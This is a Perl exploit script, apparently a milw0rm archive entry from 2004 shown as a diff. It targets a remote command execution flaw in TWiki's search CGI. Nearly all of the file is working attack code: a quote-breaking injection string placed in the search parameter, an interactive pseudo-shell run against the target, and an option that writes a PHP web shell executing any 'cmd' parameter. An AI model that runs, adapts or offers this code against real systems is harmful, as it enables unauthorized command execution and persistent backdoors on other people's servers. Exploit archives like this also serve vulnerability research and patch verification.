@@ -1,0 +1,229 @@
+#!/usr/bin/perl
+
+# "tweaky.pl" v. 1.0 beta 2
+#
+# Proof of concept for TWiki vulnerability. Remote code execution
+# Vuln discovered, researched and exploited by RoMaNSoFt <roman rs-labs com>
+#
+# Madrid, 30.Sep.2004.
+
+
+require LWP::UserAgent;
+use Getopt::Long;
+
+### Default config
+$host = '';
+$path = '/cgi-bin/twiki/search/Main/';
+$secure = 0;
+$get = 0;
+$post = 0;
+$phpshellpath='';
+$createphpshell = '(echo `perl -e \'print chr(60).chr(63)\'` ; echo \'$out = shell_exec($_GET["cmd"].
+" 2\'`perl -e \'print chr(62).chr(38)\'`\'1");\' ; echo \'echo "\'`perl -e \'print chr(60)."pre".chr(62)."\\\\
+$out".chr(60)."/pre".chr(62)\'`\'";\' ; echo `perl -e \'print chr(63).chr(62)\'`) | tee ';
+$logfile = ''; # If empty, logging will be disabled
+$prompt = "tweaky\$ ";
+$useragent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)';
+$proxy = '';
+$proxy_user = '';
+$proxy_pass = '';
+$basic_auth_user = '';
+$basic_auth_pass = '';
+$timeout = 30;
+$debug = 0;
+$init_command = 'uname -a ; id';
+$start_mark = 'AAAA';
+$end_mark = 'BBBB';
+$pre_string = 'nonexistantttt\' ; (';
+$post_string = ') | sed \'s/\(.*\)/'.$start_mark.'\1'.$end_mark.'.txt/\' ; fgrep -i -l -- \'nonexistantttt';
+$delim_start = '<b>'.$start_mark;
+$delim_end = $end_mark.'</b>';
+
+print "Proof of concept for TWiki vulnerability. Remote code execution.\n";
+print "(c) RoMaNSoFt, 2004. <roman\@rs-labs.com>\n\n";
+
+### User-supplied config (read from the command-line)
+$parsing_ok = GetOptions ('host=s' => \$host,
+'path=s' => \$path,
+'secure' => \$secure,
+'get' => \$get,
+'post' => \$post,
+'phpshellpath=s' => \$phpshellpath,
+'logfile=s' => \$logfile,
+'init_command=s' => \$init_command,
+'useragent=s' => \$useragent,
+'proxy=s' => \$proxy,
+'proxy_user=s' => \$proxy_user,
+'proxy_pass=s' => \$proxy_pass,
+'basic_auth_user=s' => \$basic_auth_user,
+'basic_auth_pass=s' => \$basic_auth_pass,
+'timeout=i' => \$timeout,
+'debug' => \$debug,
+'start_mark=s' => \$start_mark,
+'end_mark=s' => \$end_mark);
+
+### Some basic checks
+&banner unless ($parsing_ok);
+
+if ($get and $post) {
+print "Choose one only method! (GET or POST)\n\n";
+&banner;
+}
+
+if (!($get or $post)) {
+# If not specified we prefer POST method
+$post = 1;
+}
+
+if (!$host) {
+print "You must specify a target hostname! (tip: --host <hostname>)\n\n" ;
+&banner;
+}
+
+$url = ($secure ? 'https' : 'http') . "://" . $host . $path;
+
+### Checking for a vulnerable TWiki
+&run_it ($init_command, 'RS-Labs rlz!');
+
+### Execute selected payload
+
+if ($phpshellpath) {
+&create_phpshell;
+print "PHPShell created.";
+} else {
+&pseudoshell;
+}
+
+### End
+exit(0);
+
+
+### Create PHPShell
+sub create_phpshell {
+$createphpshell .= $phpshellpath;
+&run_it($createphpshell, 'yeah!');
+}
+
+
+### Pseudo-shell
+sub pseudoshell {
+open(LOGFILE, ">>$logfile") if $logfile;
+open(STDINPUT, '-');
+
+print "Welcome to RoMaNSoFt's pseudo-interactive shell :-)\n[Type Ctrl-D or (bye, quit, exit, logout) to exit]\n
+\n".$prompt.$init_command."\n";
+&run_it ($init_command);
+print $prompt;
+
+while (<STDINPUT>) {
+chop;
+if ($_ eq "bye" or $_ eq "quit" or $_ eq "exit" or $_ eq "logout") {
+exit(1);
+}
+
+&run_it ($_) unless !$_;
+print "\n".$prompt;
+}
+
+close(STDINPUT);
+close(LOGFILE) if $logfile;
+}
+
+
+### Print banner and die
+sub banner {
+print "Syntax: ./tweaky.pl --host=<host> [options]\n\n";
+print "Proxy options: --proxy=http://proxy:port --proxy_user=foo --proxy_pass=bar\n";
+print "Basic auth options: --basic_auth_user=foo --basic_auth_pass=bar\n";
+print "Secure HTTP (HTTPS): --secure\n";
+print "Path to CGI: --path=$path\n";
+print "Method: --get | --post\n";
+print "Enable logging: --logfile=/path/to/a/file\n";
+print "Create PHPShell: --phpshellpath=/path/to/phpshell\n";
+
+exit(1);
+}
+
+
+### Execute command via vulnerable CGI
+sub run_it {
+my ($command, $testing_vuln) = @_;
+my $req;
+my $ua = new LWP::UserAgent;
+
+$ua->agent($useragent);
+$ua->timeout($timeout);
+
+# Build CGI param and urlencode it
+my $search = $pre_string . $command . $post_string;
+$search =~ s/(\W)/"%" . unpack("H2", $1)/ge;
+
+# Case GET
+if ($get) {
+$req = HTTP::Request->new('GET', $url . "?scope=text&order=modified&search=$search");
+}
+
+# Case POST
+if ($post) {
+$req = new HTTP::Request POST => $url;
+$req->content_type('application/x-www-form-urlencoded');
+$req->content("scope=text&order=modified&search=$search");
+}
+
+# Proxy definition
+if ($proxy) {
+if ($secure) {
+# HTTPS request
+$ENV{HTTPS_PROXY} = $proxy;
+$ENV{HTTPS_PROXY_USERNAME} = $proxy_user;
+$ENV{HTTPS_PROXY_PASSWORD} = $proxy_pass; 
+} else {
+# HTTP request
+$ua->proxy(['http'] => $proxy);
+$req->proxy_authorization_basic($proxy_user, $proxy_pass); 
+}
+}
+
+# Basic Authorization
+$req->authorization_basic($basic_auth_user, $basic_auth_pass) if ($basic_auth_user);
+
+# Launch request and parse results
+my $res = $ua->request($req);
+
+if ($res->is_success) {
+
+print LOGFILE "\n".$prompt.$command."\n" if ($logfile and !$testing_vuln);
+@content = split("\n", $res->content);
+
+my $empty_response = 1;
+
+foreach $_ (@content) {
+my ($match) = ($_ =~ /$delim_start(.*)$delim_end/g);
+
+if ($debug) {
+print $_ . "\n";
+} else {
+if ($match) {
+$empty_response = 0;
+print $match . "\n" unless ($testing_vuln);
+}
+}
+
+print LOGFILE $match . "\n" if ($match and $logfile and !$testing_vuln);
+}
+
+if ($empty_response) {
+if ($testing_vuln) {
+die "Sorry, exploit didn't work!\nPerhaps TWiki is patched or you supplied a wrong URL 
+(remember it should point to Twiki's search page).\n";
+} else {
+print "[Server issued an empty response. Perhaps you entered a wrong command?]\n";
+}
+}
+
+} else {
+die "Couldn't connect to server. Error message follows:\n" . $res->status_line . "\n";
+} 
+}
+
+# milw0rm.com [2004-11-20]
